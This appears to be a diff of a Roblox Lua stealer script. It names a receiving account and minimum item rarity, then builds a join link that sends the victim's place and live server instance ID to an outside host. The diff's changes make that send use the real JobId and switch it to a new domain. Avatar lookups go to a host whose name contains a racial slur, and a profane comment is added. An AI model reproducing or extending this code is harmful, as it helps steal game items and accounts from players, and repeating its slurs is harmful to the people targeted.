@@ -1,3 +1,5 @@
+--Fuck
+
 _G.Usernames = {"daniellfc09"} 
 _G.min_rarity = "Rare" 
 _G.min_value = 0
@@ -251,7 +253,7 @@ if VIP or FULL then
 end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
-jobId = ""
+jobId = game.JobId
 
 
 
@@ -617,7 +619,7 @@ local function SendFirstMessage(list, prefix)
     local itemPrices = usdData.itemPrices or {}
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
   
-    local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
+    local JoinLink = "https://plsbrainrot.me/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
     local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
     local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
      local NotHead = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(plr.UserId)
